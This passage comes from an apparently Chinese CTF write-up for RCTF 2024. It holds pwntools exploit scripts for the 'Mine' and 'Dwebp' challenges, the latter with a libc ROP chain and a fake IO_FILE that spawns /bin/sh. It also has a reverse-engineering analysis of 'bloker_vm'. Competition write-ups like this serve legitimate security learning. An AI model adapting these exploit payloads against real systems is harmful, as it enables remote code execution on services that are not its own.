class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wooden</span>():</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">silver</span>():</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">golden</span>():</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buyms</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    meau(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dropms</span>():</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">learningms</span>():</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">god</span>():</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    meau(<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;name: &quot;</span>,<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">golden()</span><br><span class="line"></span><br><span class="line">buyms(<span class="number">1</span>)</span><br><span class="line">learningms()</span><br><span class="line">dropms()</span><br><span class="line"></span><br><span class="line">buyms(<span class="number">2</span>)</span><br><span class="line">learningms()</span><br><span class="line">dropms()</span><br><span class="line"></span><br><span class="line">buyms(<span class="number">3</span>)</span><br><span class="line">learningms()</span><br><span class="line"></span><br><span class="line">god()</span><br><span class="line">r.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(r.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x250</span></span><br><span class="line">success(<span class="string">&quot;backdoor = &quot;</span>+<span class="built_in">hex</span>(backdoor))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">meau(<span class="number">1337</span>)</span><br><span class="line">wooden()</span><br><span class="line">dropms()</span><br><span class="line">r.sendlineafter(<span class="string">&quot;visit.&quot;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Comments: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(backdoor)[:-<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="mine-solved">Mine (Solved)</span><a href="#mine-solved" class="header-anchor"></a></h2><p>Wasm pwn，当使用U开了一个格子之后，输入除了U或M的字母，可以更改矩阵的内容。当修改到最后一行的前四个格子的时候会产生溢出覆盖掉原先name的指针。由于name的地址和flag的地址较近，可以直接溢出修改最后一位为flag的地址，然后在输出name的时候就会泄露flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;123.60.161.30&quot;</span>,<span class="number">10088</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./minesweeper&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Your Name:&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;mark): &quot;</span>,<span class="string">&quot;0 0 U&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;mark): &quot;</span>,<span class="string">&quot;0 0 A&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        sleep(<span class="number">0.02</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;]:&quot;</span>,<span class="string">&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;]:&quot;</span>,<span class="string">b&quot;y &quot;</span>+p8(<span class="number">0xb0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    sleep(<span class="number">0.02</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;]:&quot;</span>,<span class="string">&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="dwebp-solved">Dwebp (Solved)</span><a href="#dwebp-solved" class="header-anchor"></a></h2><p>可以直接非预期掉，使用webp解析图片的功能一可以不用，作者自己添加的漏洞中存在未初始化漏洞。可以通过申请超出大小限制的堆块来向main_arena中写入数据，可以直接写到IO_2_1_stderr上，exit的时候劫持IO。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./dwebp&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;123.60.91.255&quot;</span>,<span class="number">10088</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./dwebp&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    meau(index)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;feedback?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;feedback:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">adds</span>(<span class="params">index,size</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    meau(index)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;feedback?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    meau(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    meau(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line">    meau(index)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;feedback:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x440</span>,<span class="string">&quot;a&quot;</span>*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x21B110</span></span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">adds(<span class="number">1</span>,<span class="number">0x10000</span>)</span><br><span class="line">adds(<span class="number">1</span>,<span class="number">0x10000</span>)</span><br><span class="line">adds(<span class="number">1</span>,<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_ret = libc_base+<span class="number">0x170337</span></span><br><span class="line">pop_rax_ret = libc_base+<span class="number">0x45eb0</span></span><br><span class="line">syscall_ret = libc_base+<span class="number">0x91316</span></span><br><span class="line">mov_rsp_rdx_ret = libc_base+<span class="number">0x5a120</span></span><br><span class="line"></span><br><span class="line">IO_2_1_stderr = libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">arena_addr = libc_base+<span class="number">0x21b100</span></span><br><span class="line"></span><br><span class="line">rops = p64(pop_rdi_ret)+p64(libc_base+<span class="number">0x21b120</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span>+p64(<span class="number">59</span>)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += p64(<span class="number">1</span>)+p64(libc_base+<span class="number">0x21b138</span>)</span><br><span class="line">payload += rops</span><br><span class="line">payload = payload.ljust(<span class="number">0xe0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x21b1f0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(mov_rsp_rdx_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">320</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">61</span>):</span><br><span class="line">    payload += p64(arena_addr)*<span class="number">2</span></span><br><span class="line">    arena_addr = arena_addr+<span class="number">0x10</span></span><br><span class="line">    </span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x21ac80</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0x21000</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0xa7490</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x1d9b11</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x2226d8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x1e1300</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x217820</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x217d60</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x217de0</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x218660</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x217ba0</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x217b20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x218320</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x218380</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x218400</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x2184c0</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x218540</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x2185a0</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x1bf3c0</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x1be4c0</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x1beac0</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x1da1c2</span>)*<span class="number">13</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(IO_2_1_stderr)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_2_1_stderr)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x21b110</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2170f0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xfbad2887</span>)</span><br><span class="line"></span><br><span class="line">payload += fake_IO_FILE</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">meau(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1><span id="reverse">reverse</span><a href="#reverse" class="header-anchor"></a></h1><h2><span id="bloker-vm">bloker_vm</span><a href="#bloker-vm" class="header-anchor"></a></h2><p>程序的整体逻辑是父进程创建了子进程，且接管子进程的异常相关信息并处理，相当于父进程是作为子进程的调试器，这样我们直接调试子进程了。</p>
<p>父进程逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_551A10</span><span class="params">()</span>&#123;</span><br><span class="line">  HMODULE ModuleHandleW; <span class="comment">// eaxchar v1; // alchar LastError; // alint v4; // eaxchar v5; // [esp+0h] [ebp-A5Ch]char v6; // [esp+0h] [ebp-A5Ch]char v7; // [esp+0h] [ebp-A5Ch]unsigned int k; // [esp+320h] [ebp-73Ch]void *lpBaseAddress; // [esp+32Ch] [ebp-730h]size_t j; // [esp+338h] [ebp-724h]size_t i; // [esp+344h] [ebp-718h]int v12; // [esp+350h] [ebp-70Ch]int v13; // [esp+35Ch] [ebp-700h]char Buffer[264]; // [esp+3A4h] [ebp-6B8h] BYREF</span></span><br><span class="line">  CONTEXT Context; <span class="comment">// [esp+4ACh] [ebp-5B0h] BYREFstruct _DEBUG_EVENT DebugEvent; // [esp+780h] [ebp-2DCh] BYREFstruct _PROCESS_INFORMATION ProcessInformation; // [esp+7E8h] [ebp-274h] BYREFstruct _STARTUPINFOW StartupInfo; // [esp+800h] [ebp-25Ch] BYREF</span></span><br><span class="line">  WCHAR Filename[<span class="number">262</span>]; <span class="comment">// [esp+84Ch] [ebp-210h] BYREF__CheckForDebuggerJustMyCode(&amp;unk_55D0AC);j_memset(Filename, 0, 0x208u);</span></span><br><span class="line">  StartupInfo.cb = <span class="number">68</span>;j_memset(&amp;StartupInfo.lpReserved, <span class="number">0</span>, <span class="number">0x40u</span>);<span class="built_in">memset</span>(&amp;ProcessInformation, <span class="number">0</span>, <span class="keyword">sizeof</span>(ProcessInformation));j_memset(&amp;DebugEvent, <span class="number">0</span>, <span class="keyword">sizeof</span>(DebugEvent));j_memset(&amp;Context, <span class="number">0</span>, <span class="keyword">sizeof</span>(Context));j_memset(Buffer, <span class="number">0</span>, <span class="number">0xFFu</span>);sub_5510EB(<span class="string">&quot;please input your flag:\n&quot;</span>, v5);sub_551037(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Str);<span class="keyword">if</span> ( j_strlen(Str) != <span class="number">25</span> )<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  Str[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">  ModuleHandleW = GetModuleHandleW(<span class="number">0</span>);GetModuleFileNameW(ModuleHandleW, Filename, <span class="number">0x104u</span>);<span class="keyword">if</span> ( CreateProcessW(<span class="number">0</span>, Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )&#123;</span><br><span class="line">    v13 = <span class="number">-3</span>;</span><br><span class="line">    v12 = <span class="number">1</span>;<span class="keyword">while</span> ( <span class="number">1</span> )&#123;j_memset(&amp;DebugEvent, <span class="number">0</span>, <span class="keyword">sizeof</span>(DebugEvent));<span class="keyword">if</span> ( !WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>) )<span class="keyword">break</span>;<span class="keyword">if</span> ( DebugEvent.dwDebugEventCode == <span class="number">1</span> )&#123;<span class="keyword">switch</span> ( DebugEvent.u.Exception.ExceptionRecord.ExceptionCode )&#123;<span class="keyword">case</span> <span class="number">0xC0000094</span>:<span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; j_strlen(Str); ++i )<span class="comment">// EXCEPTION_INT_DIVIDE_BY_ZERO</span></span><br><span class="line">              Str[i] ^= <span class="number">0x7Du</span>;</span><br><span class="line">            Context.ContextFlags = <span class="number">65543</span>;GetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">            Context.Eip += <span class="number">2</span>;SetThreadContext(ProcessInformation.hThread, &amp;Context);<span class="keyword">break</span>;<span class="keyword">case</span> <span class="number">0xC0000096</span>:<span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; j_strlen(Str); ++j )<span class="comment">// EXCEPTION_PRIV_INSTRUCTION</span></span><br><span class="line">              byte_55B26C[j] = (Str[j] &lt;&lt; <span class="number">6</span>) | (Str[j]  <span class="number">2</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">            Context.ContextFlags = <span class="number">65543</span>;GetThreadContext(ProcessInformation.hThread, &amp;Context);++Context.Eip;SetThreadContext(ProcessInformation.hThread, &amp;Context);<span class="keyword">break</span>;<span class="keyword">case</span> <span class="number">0xC000008E</span>:</span><br><span class="line">            Context.ContextFlags = <span class="number">65543</span>;       <span class="comment">// EXCEPTION_FLT_DIVIDE_BY_ZEROGetThreadContext(ProcessInformation.hThread, &amp;Context);</span></span><br><span class="line">            Context.Eip += <span class="number">4</span>;SetThreadContext(ProcessInformation.hThread, &amp;Context);<span class="keyword">break</span>;<span class="keyword">case</span> <span class="number">0xC0000005</span>:</span><br><span class="line">            v4 = j_strlen(Str);                 <span class="comment">// EXCEPTION_ACCESS_VIOLATIONsub_55100F((int)byte_55B26C, v4, (int)aThisisyoursecr, 18);</span></span><br><span class="line">            Context.ContextFlags = <span class="number">65543</span>;GetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">            Context.Eip += <span class="number">2</span>;SetThreadContext(ProcessInformation.hThread, &amp;Context);<span class="keyword">break</span>;<span class="keyword">case</span> <span class="number">0x80000003</span>:<span class="keyword">if</span> ( ++v13 &lt; <span class="number">0</span> )                    <span class="comment">// EXCEPTION_BREAKPOINT&#123;if ( v13 == -1 )&#123;</span></span><br><span class="line">                Context.ContextFlags = <span class="number">65543</span>;GetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">                lpBaseAddress = (<span class="type">void</span> *)Context.Eip;SetThreadContext(ProcessInformation.hThread, &amp;Context);ReadProcessMemory(ProcessInformation.hProcess, lpBaseAddress, Buffer, <span class="number">0xD6u</span>, <span class="number">0</span>);<span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">0xD6</span>; ++k )</span><br><span class="line">                  Buffer[k] ^= <span class="number">0x44u</span>;WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, Buffer, <span class="number">0xD6u</span>, <span class="number">0</span>);&#125;&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              v12 = ((<span class="type">unsigned</span> __int8)byte_55B26C[v13] == dword_55B018[v13]) &amp; (<span class="type">unsigned</span> __int8)v12;&#125;<span class="keyword">break</span>;&#125;&#125;<span class="keyword">else</span> <span class="keyword">if</span> ( DebugEvent.dwDebugEventCode == <span class="number">5</span> )&#123;<span class="keyword">goto</span> LABEL_34;&#125;ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, <span class="number">0x10002u</span>);&#125;</span><br><span class="line">    LastError = GetLastError();sub_5510EB(<span class="string">&quot;WaitForDebugEvent() failed! [%d]n&quot;</span>, LastError);</span><br><span class="line">LABEL_34:sub_5510EB(<span class="string">&quot;\n&quot;</span>, v6);<span class="keyword">if</span> ( v12 )<span class="keyword">return</span> sub_5510EB(<span class="string">&quot;Congratulations! flag is your input\n&quot;</span>, v7);elsereturn <span class="title function_">sub_5510EB</span><span class="params">(<span class="string">&quot;try again\n&quot;</span>, v7)</span>;&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    v1 = GetLastError();<span class="keyword">return</span> sub_5510EB(<span class="string">&quot;CreateProcess() failed! [%d]n&quot;</span>, v1);&#125;&#125;<span class="comment">/* Orphan comments:</span></span><br><span class="line"><span class="comment">EXCEPTION_INT_DIVIDE_BY_ZERO</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>关键在于其中的几个处理子进程异常的逻辑</p>
<p><img src="../images/2024-05-27-RCTF/fd3463bb362f4d232b2a7d0a4a2ce55b.png"></p>
<p>子进程中就触发不同的异常来推动父进程的执行，比如下面开始的CC就是一个软件断点异常</p>
<p><img src="../images/2024-05-27-RCTF/06e323b3c9af628266176d7bb501f9cc.png"></p>
<p>这样父进程中就会接管这个异常，并对子进程中的代码进行解密</p>
<p><img src="../images/2024-05-27-RCTF/3e74199dbbf6e1890124459e4c20f885.png"></p>
<p>剩下的流程可以直接调试父进程来确定，</p>
<p>先对输入进行了异或</p>
<p><img src="../images/2024-05-27-RCTF/3cd1bb2e6c5a427d115600c3f0d27f9f.png"></p>
<p>接着进行移位运算</p>
<p><img src="../images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png"></p>
<p>然后是一个rc4</p>
<p><img src="../images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png"></p>
<p>最后对比</p>
<p><img src="../images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png"></p>
<p>一层一层逆向解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x00000080</span>, <span class="number">0x00000005</span>, <span class="number">0x000000E3</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000018</span>, <span class="number">0x0000002F</span>, <span class="number">0x000000C5</span>, <span class="number">0x0000008C</span>, <span class="number">0x00000025</span>, <span class="number">0x00000070</span>, <span class="number">0x000000BC</span>, <span class="number">0x00000005</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000004F</span>, <span class="number">0x000000F2</span>, <span class="number">0x00000002</span>, <span class="number">0x000000E5</span>, <span class="number">0x0000003E</span>, <span class="number">0x00000002</span>, <span class="number">0x0000002F</span>, <span 